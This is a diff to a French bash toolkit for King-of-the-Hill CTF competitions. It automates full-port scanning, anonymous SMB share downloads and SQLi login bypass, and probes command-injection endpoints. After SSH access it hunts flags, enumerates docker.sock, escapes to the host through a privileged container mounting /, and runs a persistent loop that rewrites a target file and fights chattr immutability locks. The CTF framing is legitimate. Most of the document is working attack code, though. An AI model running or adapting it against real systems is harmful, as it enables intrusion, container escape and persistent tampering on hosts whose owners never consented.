@@ -1,67 +1,90 @@
 #!/usr/bin/env bash
-# koth_auto.sh — Boite a outils KOTH generique, adaptee pour NCTF26 (format
-# de flag NCTF{...}) a partir d'un script THM-specifique deja valide
-# (2 victoires sur 3 rounds, session 2026-09-14). Base : recon complete
-# immediate (TOUS les ports, les backdoors KOTH vivent sur des ports
-# non-standards aleatoires), sondes FTP/SMB anonymes, RCE web bete,
-# SQLi login bypass, GTFOBins/SUID, mysql history. AUCUNE box KOTH n'est
-# identique : ce script fait gagner du temps sur le repetitif, il ne
-# garantit pas un pwn 100% automatique.
+# koth_auto.sh — Boite a outils KOTH generique, a adapter juste en changeant
+# l'IP. Construite a partir de 2 rounds reels joues et gagnes (THM, 2026-10-30) :
+#   - Round 1 (H1:Hard) : fuite creds API -> SSH -> root PwnKit -> decouverte
+#     docker.sock -> exec dans conteneurs voisins -> evasion hote physique ->
+#     bataille chattr +i/-i -> victoire via King Time cumule (450 vs 390 pts).
+#   - Round 2 (Tyler)   : flag direct via partage SMB anonyme (pas seulement
+#     liste des partages — il faut TELECHARGER le contenu).
 #
-# Lecon cle (round 1 perdu a cause de ca, voir knowledge/patterns/misc/
-# koth-methodology-thm-validated.md) : ne JAMAIS se contenter des ports
-# "probables" — scanner TOUT (-p-), les vecteurs gagnants vivent souvent
-# sur des ports applicatifs custom (ex. 9001/9002, 15065, 46969...).
+# AUCUNE box KOTH n'est identique : ce script fait gagner du temps sur le
+# repetitif (recon, SMB, SSH hunt, ecriture+maintien du fichier king), il ne
+# garantit pas un pwn 100% automatique. L'exploitation initiale (RCE/SQLi
+# specifique a la box) reste a faire a la main une fois les pistes identifiees.
+#
+# Lecon cle round 1 : ne JAMAIS se contenter des ports "probables" — scanner
+# TOUT (-p-), les vecteurs gagnants vivent souvent sur des ports custom.
+# Lecon cle round 2 : un partage SMB anonyme peut contenir le flag EN DIRECT,
+# toujours descendre les fichiers, pas juste lister.
+# Lecon cle round 1 (le facteur decisif) : le King Time cumule compte plus que
+# la prise initiale — ne jamais s'arreter a une seule ecriture du fichier king,
+# boucler la reassertion en arriere-plan pendant tout le round. Le vrai fichier
+# king peut vivre HORS des conteneurs applicatifs, sur l'hote physique —
+# toujours verifier /var/run/docker.sock une fois root/acces privilegie.
 #
 # Usage:
 #   ./koth_auto.sh <IP> <NOM_EQUIPE_OU_PSEUDO> [SSH_USER] [SSH_PASS] [SSH_PORT]
+#   ./koth_auto.sh --holdking <IP> <NOM_EQUIPE_OU_PSEUDO> <SSH_USER> <SSH_PASS> [SSH_PORT] [INTERVAL_SEC]
 #
-#   <IP>                  IP de la cible affichee sur la page KOTH
-#   <NOM_EQUIPE_OU_PSEUDO> Nom a ecrire dans le fichier "king" une fois
-#                         root/acces suffisant obtenu
-#   SSH_USER/PASS/PORT (optionnels) : creds SSH deja trouves -> phase 2
-#                         (chasse aux flags + ecriture du fichier king)
+#   Phase 1 (recon, debut de round, pas encore d'acces) :
+#     ./koth_auto.sh 10.10.76.190 NotreEquipe
 #
-# Exemple phase 1 (recon + exploitation de base, des le debut du round):
-#   ./koth_auto.sh 10.10.76.190 NotreEquipe
+#   Phase 2 (creds SSH trouves a la main — fuite API, SQLi, SMB, etc.) :
+#     ./koth_auto.sh 10.10.76.190 NotreEquipe hermione 'motdepasse' 10514
+#     -> chasse les flags, cherche docker.sock, ecrit le fichier king partout
+#        ou possible, et PROPOSE la commande pour lancer la boucle de maintien.
 #
-# Exemple phase 2 (creds SSH trouves a la main, ex. via SQLi):
-#   ./koth_auto.sh 10.10.76.190 NotreEquipe hermione 'motdepasse' 10514
+#   Phase 3 (boucle de maintien du King Time, a lancer en arriere-plan une
+#   fois root/ecriture king confirmee — c'est CA qui fait gagner le round) :
+#     nohup ./koth_auto.sh --holdking 10.10.76.190 NotreEquipe hermione 'motdepasse' 10514 15 \
+#       > koth_holdking.log 2>&1 &
 #
-# Resultat : un dossier ./koth_<IP>_<timestamp>/ avec tous les logs, et
-# les flags NCTF{...} detectes affiches en clair a l'ecran.
+# Format de flag detecte par defaut : NCTF{...} ou THM{...} (insensible a la
+# casse). Pour un autre format, exporte FLAG_REGEX avant de lancer :
+#   export FLAG_REGEX='FLAG\{[^}]+\}'
 #
-# IMPORTANT reglement NCTF26 : pas de bruteforce ni de denial-of-service
-# (voir regles ctf.tg). Ce script ne fait AUCUN bruteforce de mot de
-# passe par defaut — seulement des tests anonymes/par defaut (FTP/SMB
-# anonyme, SQLi bypass classique), conforme au reglement. Ne pas y
-# ajouter de bruteforce de credentials.
+# IMPORTANT reglement NCTF26 : pas de bruteforce ni de denial-of-service.
+# Ce script ne fait AUCUN bruteforce de mot de passe par defaut — seulement
+# des tests anonymes/par defaut (FTP/SMB anonyme, SQLi bypass classique en
+# UNE requete). Ne pas y ajouter de bruteforce de credentials.
 
 set -uo pipefail
+
+MODE="recon"
+if [[ "${1:-}" == "--holdking" ]]; then
+    MODE="holdking"
+    shift
+fi
 
 IP="${1:-}"
 TEAM="${2:-}"
 SSH_USER="${3:-}"
 SSH_PASS="${4:-}"
 SSH_PORT="${5:-22}"
+HOLD_INTERVAL="${6:-15}"
+
+FLAG_REGEX="${FLAG_REGEX:-NCTF\{[^}]+\}|THM\{[^}]+\}}"
 
 # Noms de fichier "king"/"owner" candidats : chaque plateforme KOTH a sa
-# propre convention (CTFd KotH agent utilise souvent owner.txt par defaut,
-# THM utilise king.txt). On tente les deux + variantes pour NCTF, inconnues
-# a l'avance tant que la page d'epreuve KOTH n'est pas vue en vrai.
+# propre convention. On tente toutes les variantes connues + les chemins
+# qui se sont averes etre les vrais (hote physique, pas le conteneur appli).
 KING_FILENAMES=("king.txt" "owner.txt" "flag.txt")
 KING_DIR_CANDIDATES=("/root" "/opt/koth" "/var/koth" "/srv/koth")
 
 if [[ -z "$IP" || -z "$TEAM" ]]; then
     echo "Usage: $0 <IP> <NOM_EQUIPE_OU_PSEUDO> [SSH_USER] [SSH_PASS] [SSH_PORT]"
+    echo "       $0 --holdking <IP> <NOM_EQUIPE> <SSH_USER> <SSH_PASS> [SSH_PORT] [INTERVAL_SEC]"
     exit 1
 fi
 
 TS=$(date +%s)
 OUTDIR="./koth_${IP}_${TS}"
-mkdir -p "$OUTDIR"
+mkdir -p "$OUTDIR" 2>/dev/null
 FLAGFILE="$OUTDIR/flags_found.txt"
-touch "$FLAGFILE"
+touch "$FLAGFILE" 2>/dev/null
+# Fichier stable (pas horodate) qui garde le chemin king qui a marche pour
+# cette IP, pour que --holdking puisse le reutiliser sans tout re-decouvrir.
+STATE_FILE="./koth_${IP}_kingpath.txt"
 
 C_G="\033[1;32m"; C_R="\033[1;31m"; C_Y="\033[1;33m"; C_B="\033[1;34m"; C_N="\033[0m"
 
@@ -72,9 +95,8 @@ err()  { echo -e "${C_R}[-]${C_N} $*"; }
 
 grab_flags() {
     # $1 = texte a scanner, $2 = source (pour le log)
-    # Format NCTF26 confirme : NCTF{...} (voir ctf.tg).
     local matches
-    matches=$(grep -oE 'NCTF\{[^}]+\}' <<<"$1" 2>/dev/null | sort -u)
+    matches=$(grep -ioE "$FLAG_REGEX" <<<"$1" 2>/dev/null | sort -u)
     if [[ -n "$matches" ]]; then
         while IFS= read -r m; do
             if ! grep -qxF "$m" "$FLAGFILE" 2>/dev/null; then
@@ -83,6 +105,11 @@ grab_flags() {
             fi
         done <<<"$matches"
     fi
+}
+
+ssh_run() {
+    # Wrapper SSH reutilisable (phase 2 et 3)
+    sshpass -p "$SSH_PASS" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o ConnectTimeout=6 "$SSH_USER@$IP" "$@"
 }
 
 # ============================================================
@@ -107,8 +134,6 @@ phase1_recon() {
     nmap -Pn -p"$PORTLIST" -sV -sC -oN "$OUTDIR/services.txt" "$IP" >/dev/null 2>&1 &
     NMAP_PID=$!
 
-    # --- Tests en parallele pendant que nmap -sV tourne ---
-
     for p in $PORTS; do
         case "$p" in
             21)
@@ -125,10 +150,29 @@ phase1_recon() {
                 fi
                 ;;
             139|445)
-                log "[SMB:$p] Test anonyme..."
+                log "[SMB:$p] Test anonyme + listing des partages..."
                 timeout 10 smbclient -L "//$IP/" -N > "$OUTDIR/smb_shares.txt" 2>&1
                 ok "[SMB] Partages listes — voir $OUTDIR/smb_shares.txt"
                 cat "$OUTDIR/smb_shares.txt"
+
+                # Lecon round 2 : descendre le CONTENU de chaque partage, pas
+                # juste la liste — le flag peut etre directement dans un fichier.
+                SHARES=$(grep -oE '^\s*\S+\s+Disk' "$OUTDIR/smb_shares.txt" 2>/dev/null | awk '{print $1}')
+                SMB_DUMP_DIR="$OUTDIR/smb_dump"
+                mkdir -p "$SMB_DUMP_DIR"
+                for share in $SHARES; do
+                    [[ "$share" == "IPC\$" || "$share" == "print\$" ]] && continue
+                    log "[SMB:$p] Telechargement recursif du partage '$share'..."
+                    ( cd "$SMB_DUMP_DIR" && timeout 20 smbclient "//$IP/$share" -N -c "prompt OFF; recurse ON; mget *" >/dev/null 2>&1 )
+                done
+                if [[ -n "$(ls -A "$SMB_DUMP_DIR" 2>/dev/null)" ]]; then
+                    ok "[SMB] Fichiers telecharges dans $SMB_DUMP_DIR :"
+                    find "$SMB_DUMP_DIR" -type f | sed 's/^/    /'
+                    grab_flags "$(find "$SMB_DUMP_DIR" -type f -exec cat {} \; 2>/dev/null)" "SMB:$p fichiers telecharges"
+                    # Indices de creds souvent trouves en clair (ex. alert.txt round 2)
+                    find "$SMB_DUMP_DIR" -type f -iname "*alert*" -o -iname "*cred*" -o -iname "*pass*" 2>/dev/null \
+                        | while read -r f; do warn "[SMB] Fichier potentiel de creds : $f -> $(cat "$f" 2>/dev/null | head -3)"; done
+                fi
                 ;;
             22)
                 log "[SSH:$p] Banner : $(timeout 5 bash -c "echo | nc -w3 $IP $p 2>/dev/null | head -c 80")"
@@ -147,9 +191,6 @@ phase1_recon() {
             ok "[HTTP:$p] Reponse HTTP recue — voir $OUTDIR/http_${p}_root.html"
             grab_flags "$BODY" "HTTP:$p /"
 
-            # Detecte un formulaire de login classique et teste le bypass SQLi
-            # classique (autorise par le reglement : ce n'est pas un bruteforce,
-            # une seule requete, un payload connu, pas une boucle de tentatives).
             if echo "$BODY" | grep -qiE '<form[^>]*action="([^"]*login[^"]*)"'; then
                 ACTION=$(echo "$BODY" | grep -oiE 'action="[^"]*"' | head -1 | sed -E 's/action="([^"]*)"/\1/')
                 warn "[HTTP:$p] Formulaire de login detecte (action=$ACTION) — tentative SQLi bypass (1 requete, pas de bruteforce)..."
@@ -163,9 +204,6 @@ phase1_recon() {
                 done
             fi
 
-            # Detecte un endpoint generique "execution de commande" (style /api/cmd)
-            # Pattern deja observe en KOTH : page "host monitoring"/"ping this IP",
-            # validation IP cote JS seulement -> payload shell brut accepte tel quel.
             for apiendpoint in api/cmd cmd api/ping ping; do
                 RESP=$(timeout 5 curl -s -m 4 -X POST "http://$IP:$p/$apiendpoint" --data "id" 2>/dev/null)
                 if echo "$RESP" | grep -qE 'uid=[0-9]+\(.*\)'; then
@@ -193,7 +231,7 @@ phase1_recon() {
 }
 
 # ============================================================
-# PHASE 2 — CHASSE AUX FLAGS + FICHIER KING (necessite SSH)
+# PHASE 2 — CHASSE AUX FLAGS + DOCKER.SOCK + FICHIER KING
 # ============================================================
 phase2_hunt() {
     log "Phase 2 : connexion SSH a $SSH_USER@$IP:$SSH_PORT..."
@@ -203,22 +241,22 @@ phase2_hunt() {
         return 1
     fi
 
-    SSH_CMD="sshpass -p $SSH_PASS ssh -p $SSH_PORT -o StrictHostKeyChecking=no -o ConnectTimeout=6 $SSH_USER@$IP"
-
-    if ! $SSH_CMD "true" 2>/dev/null; then
+    if ! ssh_run "true" 2>/dev/null; then
         err "Connexion SSH echouee. Verifie user/pass/port."
         return 1
     fi
     ok "SSH OK."
 
-    log "Recherche de flags, sudo -l, SUID, mysql history, cron, demon KOTH..."
-    REMOTE_OUT=$($SSH_CMD "
+    log "Recherche de flags, sudo -l, SUID, mysql history, cron, demon KOTH, docker.sock..."
+    REMOTE_OUT=$(ssh_run "
         echo '---find-flags---'
-        find / -xdev \( -iname 'flag*' -o -iname '*.flag' -o -iname 'king*' -o -iname 'owner*' -o -iname 'NCTF*' \) 2>/dev/null -exec sh -c 'echo ==={}===; cat {} 2>/dev/null' \;
+        find / -xdev \( -iname 'flag*' -o -iname '*.flag' -o -iname 'king*' -o -iname 'owner*' -o -iname 'NCTF*' -o -iname 'thm*' \) 2>/dev/null -exec sh -c 'echo ==={}===; cat {} 2>/dev/null' \;
         echo '---koth-daemon-strings---'
-        for b in /root/koth /opt/koth/* /usr/local/bin/koth* /usr/local/bin/*agent*; do
+        for b in /root/koth /opt/koth/* /usr/local/bin/koth* /usr/local/bin/*agent* /usr/bin/koth*; do
             [ -f \"\$b\" ] && echo \"== \$b ==\" && strings \"\$b\" 2>/dev/null | grep -iE 'king|owner|\\.txt' | head -20
         done
+        echo '---docker-sock---'
+        ls -la /var/run/docker.sock 2>/dev/null
         echo '---sudo-l---'
         sudo -n -l 2>&1
         echo '---suid---'
@@ -237,19 +275,57 @@ phase2_hunt() {
     ok "Resultats bruts dans $OUTDIR/ssh_hunt.txt"
     grab_flags "$REMOTE_OUT" "SSH hunt"
 
-    # GTFOBins date -f rapide si sudo date NOPASSWD detecte
     if echo "$REMOTE_OUT" | grep -qE 'NOPASSWD:\s*/bin/date'; then
         warn "sudo date NOPASSWD detecte -> lecture arbitraire de fichiers root possible."
-        echo "  Exemple : $SSH_CMD \"sudo -n /bin/date -f /root/<nom_fichier>\""
+        echo "  Exemple : ssh_run \"sudo -n /bin/date -f /root/<nom_fichier>\""
     fi
 
-    log "Tentative d'ecriture du fichier king (plusieurs noms/emplacements candidats, nom exact confirme a verifier sur la page KOTH)..."
+    # --- Lecon round 1 : docker.sock monte -> acces root a TOUS les conteneurs
+    # voisins + evasion possible vers le filesystem de l'hote physique, ou le
+    # VRAI fichier king peut vivre (invisible depuis les conteneurs applicatifs).
+    DOCKER_SOCK_FOUND=$(echo "$REMOTE_OUT" | grep -A1 '^---docker-sock---' | tail -1)
+    if [[ -n "$DOCKER_SOCK_FOUND" ]]; then
+        ok "docker.sock trouve ! Enumeration des conteneurs voisins..."
+        DOCKER_OUT=$(ssh_run "
+            python3 -c \"
+import json, socket
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect('/var/run/docker.sock')
+s.sendall(b'GET /containers/json HTTP/1.1\r\nHost: localhost\r\n\r\n')
+data = b''
+while True:
+    chunk = s.recv(4096)
+    if not chunk: break
+    data += chunk
+    if len(chunk) < 4096: break
+print(data.decode(errors='replace'))
+\" 2>&1
+        ")
+        echo "$DOCKER_OUT" > "$OUTDIR/docker_containers.txt"
+        CONTAINER_IDS=$(grep -oE '\"Id\":\"[a-f0-9]+\"' "$OUTDIR/docker_containers.txt" | grep -oE '[a-f0-9]{12,64}' | sort -u)
+        if [[ -n "$CONTAINER_IDS" ]]; then
+            ok "Conteneurs trouves : $(echo "$CONTAINER_IDS" | wc -l)"
+            for cid in $CONTAINER_IDS; do
+                log "  -> recherche de flags dans le conteneur $cid..."
+                CID_OUT=$(ssh_run "docker exec $cid sh -c \"find / -xdev \\( -iname 'flag*' -o -iname 'king*' -o -iname 'NCTF*' \\) 2>/dev/null -exec cat {} \\;\"" 2>&1)
+                echo "=== $cid ===" >> "$OUTDIR/docker_flags.txt"
+                echo "$CID_OUT" >> "$OUTDIR/docker_flags.txt"
+                grab_flags "$CID_OUT" "docker exec $cid"
+            done
+            ok "Detail par conteneur dans $OUTDIR/docker_flags.txt"
+        fi
+        warn "Pour verifier si le VRAI fichier king vit sur l'hote physique (pas dans un conteneur) :"
+        echo "  ssh_run \"docker run --rm -v /:/hostfs --privileged alpine find /hostfs/root /hostfs/opt/koth -iname '*king*' -o -iname '*owner*' 2>/dev/null\""
+    fi
+
+    log "Tentative d'ecriture du fichier king (hote direct, plusieurs noms/emplacements)..."
     WRITE_LOG="$OUTDIR/king_write.txt"
     : > "$WRITE_LOG"
+    WINNING_PATH=""
     for dir in "${KING_DIR_CANDIDATES[@]}"; do
         for fname in "${KING_FILENAMES[@]}"; do
             PATH_TRY="$dir/$fname"
-            WRITE_OUT=$($SSH_CMD "
+            WRITE_OUT=$(ssh_run "
                 echo '$TEAM' > '$PATH_TRY' 2>&1 && echo KING_OK_DIRECT:$PATH_TRY
                 sudo -n bash -c \"echo '$TEAM' > '$PATH_TRY'\" 2>&1 && echo KING_OK_SUDO:$PATH_TRY
             " 2>&1)
@@ -257,25 +333,100 @@ phase2_hunt() {
             echo "$WRITE_OUT" >> "$WRITE_LOG"
             if echo "$WRITE_OUT" | grep -q "KING_OK"; then
                 ok "Fichier king ecrit avec succes : $PATH_TRY = $TEAM"
+                WINNING_PATH="$PATH_TRY"
             fi
         done
     done
 
-    if grep -q "KING_OK" "$WRITE_LOG"; then
-        ok "Au moins un fichier king/owner ecrit — voir $WRITE_LOG pour le chemin exact qui a marche."
+    if [[ -n "$WINNING_PATH" ]]; then
+        echo "$WINNING_PATH" > "$STATE_FILE"
+        ok "Chemin king sauvegarde dans $STATE_FILE pour la boucle de maintien."
+        warn ">>> MAINTENANT LANCE LA BOUCLE DE MAINTIEN (le facteur decisif du round 1) :"
+        echo "  nohup $0 --holdking $IP $TEAM $SSH_USER '$SSH_PASS' $SSH_PORT 15 > koth_holdking.log 2>&1 &"
     else
         warn "Aucune ecriture directe n'a reussi (pas encore root, ou chemin/nom different sur cette box)."
-        warn "Verifie le vrai chemin attendu : cherche les strings du demon KOTH (voir section koth-daemon-strings ci-dessus dans $OUTDIR/ssh_hunt.txt)."
-        warn "Une fois root/le bon chemin identifie, ecris-le toi-meme :"
-        echo "  echo '$TEAM' > /chemin/exact/king.txt"
+        warn "Verifie le vrai chemin attendu : cherche les strings du demon KOTH (section koth-daemon-strings dans $OUTDIR/ssh_hunt.txt)."
+        warn "Une fois le bon chemin identifie a la main, enregistre-le puis lance la boucle :"
+        echo "  echo '/chemin/exact/king.txt' > $STATE_FILE"
+        echo "  nohup $0 --holdking $IP $TEAM $SSH_USER '$SSH_PASS' $SSH_PORT 15 > koth_holdking.log 2>&1 &"
     fi
+}
+
+# ============================================================
+# PHASE 3 — BOUCLE DE MAINTIEN DU KING TIME (le facteur decisif)
+# ============================================================
+# Lecon round 1 : une seule ecriture ne suffit pas, l'adversaire reprend la
+# colline en quelques minutes. Il faut reecrire en continu ET gerer la guerre
+# de verrouillage chattr +i/-i. Le classement final se gagne sur le King Time
+# CUMULE, pas sur l'instant de la premiere prise (450 vs 390 pts au final).
+phase3_holdking() {
+    if [[ -z "$SSH_USER" || -z "$SSH_PASS" ]]; then
+        err "--holdking necessite SSH_USER et SSH_PASS."
+        exit 1
+    fi
+    if ! command -v sshpass >/dev/null; then
+        err "sshpass n'est pas installe."
+        exit 1
+    fi
+
+    local king_path=""
+    if [[ -f "$STATE_FILE" ]]; then
+        king_path=$(cat "$STATE_FILE")
+    fi
+    if [[ -z "$king_path" ]]; then
+        err "Aucun chemin king connu pour $IP (lance d'abord phase 2, ou echo le chemin dans $STATE_FILE)."
+        exit 1
+    fi
+
+    ok "Boucle de maintien demarree — reecriture de '$king_path' = $TEAM toutes les ${HOLD_INTERVAL}s."
+    warn "Ctrl+C ou 'kill' ce process pour arreter. A lancer avec nohup/& pour survivre a la fermeture du terminal."
+
+    local fails=0
+    while true; do
+        WRITE_OUT=$(ssh_run "
+            echo '$TEAM' > '$king_path' 2>&1 && echo HOLD_OK || echo HOLD_FAIL
+        " 2>&1)
+
+        if echo "$WRITE_OUT" | grep -q "HOLD_OK"; then
+            fails=0
+            echo "[$(date +%H:%M:%S)] OK — king='$TEAM' ecrit sur $king_path"
+        else
+            fails=$((fails+1))
+            warn "[$(date +%H:%M:%S)] Echec d'ecriture (tentative $fails) — $WRITE_OUT"
+
+            # Lecon round 1 : l'adversaire peut verrouiller en immutable.
+            # On tente de lever le verrou, puis on reecrit immediatement.
+            UNLOCK_OUT=$(ssh_run "
+                chattr -i '$king_path' 2>&1
+                sudo -n chattr -i '$king_path' 2>&1
+                echo '$TEAM' > '$king_path' 2>&1 && echo HOLD_OK_AFTER_UNLOCK
+                chattr +i '$king_path' 2>&1
+                sudo -n chattr +i '$king_path' 2>&1
+            " 2>&1)
+            if echo "$UNLOCK_OUT" | grep -q "HOLD_OK_AFTER_UNLOCK"; then
+                ok "[$(date +%H:%M:%S)] Verrou adversaire leve, king repris et re-verrouille."
+                fails=0
+            else
+                warn "[$(date +%H:%M:%S)] Verrou adversaire NON leve avec l'acces courant."
+                warn "  -> si docker.sock dispo, lance un conteneur --privileged -v /:/hostfs pour lever le verrou cote hote :"
+                echo "     ssh_run \"docker run --rm -v /:/hostfs --privileged alpine sh -c 'chattr -i /hostfs$king_path; echo $TEAM > /hostfs$king_path; chattr +i /hostfs$king_path'\""
+            fi
+        fi
+        sleep "$HOLD_INTERVAL"
+    done
 }
 
 # ============================================================
 # MAIN
 # ============================================================
+if [[ "$MODE" == "holdking" ]]; then
+    phase3_holdking
+    exit 0
+fi
+
 echo "=================================================="
-echo " KOTH AUTO (NCTF26) — cible: $IP   equipe/pseudo: $TEAM"
+echo " KOTH AUTO — cible: $IP   equipe/pseudo: $TEAM"
+echo " Format de flag : $FLAG_REGEX"
 echo "=================================================="
 
 if [[ -n "$SSH_USER" && -n "$SSH_PASS" ]]; then
@@ -287,7 +438,7 @@ fi
 echo
 echo "=================================================="
 if [[ -s "$FLAGFILE" ]]; then
-    ok "FLAGS TROUVES (${OUTDIR}/flags_found.txt) :"
+    ok "FLAGS TROUVES (${FLAGFILE}) :"
     cat "$FLAGFILE"
 else
     warn "Aucun flag trouve automatiquement cette fois — exploitation manuelle requise."
